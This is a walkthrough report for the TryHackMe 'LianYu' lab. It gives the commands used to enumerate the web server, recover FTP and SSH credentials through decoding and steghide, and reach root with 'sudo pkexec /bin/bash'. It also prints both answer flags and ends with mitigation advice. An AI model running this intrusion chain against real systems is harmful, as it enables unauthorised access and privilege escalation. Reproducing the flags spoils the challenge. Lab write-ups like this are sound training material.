# 🟩LianYu - Try Hack Me (THM) Walkthrough Report

**Prepared by:** Nishanth Antony  
**Date:** August 28, 2025  
**Difficulty:** Easy    
**Category:** Web Exploitation / Privilege Escalation  
**Platform:** TryHackMe (THM)  

---

## 1. Reconnaissance Steps  
**Objective:** Identify open ports and accessible services on the target.  
**Commands Used:**  
- `nmap -p- --min-rate=1000 <target_ip> -sV -T4 -v`  
- `gobuster dir -u http://<target_ip>:38980 -w /usr/share/wordlists/dirb/common.txt`  

**Findings:**  
- Port 80 open, hosting a web service.  
- Gobuster revealed `/island` directory.  
- Further gobuster on `/island` uncovered `/2100` and `/green_arrow.ticket`.  
- `/green_arrow.ticket` contained a token: `RTy8yhBQdscX`, base58 decoded to an FTP password.  

---

## 2. Exploitation Process  
**Step 1 – FTP Access**  
- Logged into FTP with username `vigilante` and decoded password:  
  `ftp vigilante@<target_ip>`  
- Downloaded files: `Leave_me_alone.png`, `Queen's_Gambit.png`, `aa.jpg`.  
- Commands:  
  ```bash
  ftp> ls
  229 Entering Extended Passive Mode (|||25926|).
  150 Here comes the directory listing.
  -rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
  -rw-r--r--    1 0        0          549924 May 05  2020 Queens_Gambit.png
  -rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
  226 Directory send OK.
  ftp> get aa.jpg
  local: aa.jpg remote: aa.jpg
  229 Entering Extended Passive Mode (|||5437|).
  150 Opening BINARY mode data connection for aa.jpg (191026 bytes).
  100% |****************************************************************************************|   186 KiB   55.60 KiB/s    00:00 ETA
  226 Transfer complete.
  191026 bytes received in 00:03 (50.79 KiB/s)
  ftp> exit
  221 Goodbye.
  ```
- Outcome: Files downloaded successfully.  

**Step 2 – Steganography Analysis**  
- Modified `Leave_me_alone.png` magic header to make it viewable, revealing a password.  
- Extracted hidden data from `aa.jpg` using steghide:  
  `steghide extract -sf aa.jpg`  
- Entered password from `Leave_me_alone.png` to retrieve `ss.zip`.  
- Extracted `ss.zip`, obtaining a password for SSH access.  
- Outcome: Obtained SSH password.  

**Step 3 – SSH Access as Slade**  
- Logged in via SSH:  
  `ssh slade@<target_ip>`  
- Retrieved user flag:  
  ```bash
  slade@LianYu:~$ ls
  user.txt
  slade@LianYu:~$ cat user.txt
  THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0NT}
  --Felicity Smoak
  ```
- Outcome: User flag retrieved.  

**Step 4 – Privilege Escalation**  
- Checked sudo permissions:  
  `sudo -l`  
- Found slade could run `/usr/bin/pkexec` as root with password.  
- Escalated to root:  
  `sudo pkexec /bin/bash`  
- Retrieved root flag:  
  ```bash
  root@LianYu:~# ls
  root.txt
  root@LianYu:~# cat root.txt
  Mission accomplished
  You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE.
  THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_ILL_BE_D34D}
  --DEATHSTROKE
  ```
- Outcome: Root flag retrieved.  

---

## 3. Proof of Concept (PoC)  
- **FTP Download:**  
  `ftp vigilante@<target_ip>` with decoded password, `get aa.jpg`.  
- **Steganography Extraction:**  
  `steghide extract -sf aa.jpg` with password from `Leave_me_alone.png`, retrieved `ss.zip`.  
- **Privilege Escalation:**  
  `sudo pkexec /bin/bash` after authenticating with SSH password.  

---

## 4. Privilege Escalation  
- Exploited sudo privilege allowing `/usr/bin/pkexec` execution as root.  
- Used password-based authentication to gain root shell.  

---

## 5. Mitigation Recommendations  
- **Web Server Hardening:**  
  - Restrict access to sensitive directories (e.g., `/island`).  
- **Authentication Security:**  
  - Use strong, unique passwords and multi-factor authentication for FTP and SSH.  
- **File Security:**  
  - Avoid storing sensitive data in images or unencrypted files on FTP.  
- **Sudo Configuration:**  
  - Limit sudo commands to specific, necessary actions; avoid password-based root access via pkexec.  
- **Patch Management:**  
  - Update vsftpd and other services to latest versions.  
  - Monitor logs for unauthorized access attempts.  

---

## 6. Lessons Learned  
- **Steganography Use:** Hidden data in images can conceal critical credentials.  
- **Weak Credentials:** Easily decoded tokens and passwords simplify initial access.  
- **Sudo Misconfiguration:** Overly permissive sudo rules enable privilege escalation.  

---

## 7. Skills Practiced  
- Network scanning (nmap)  
- Web directory enumeration (gobuster)  
- FTP file retrieval  
- Steganography analysis (steghide)  
- SSH access and privilege escalation  
- Secure reporting and mitigation strategies  
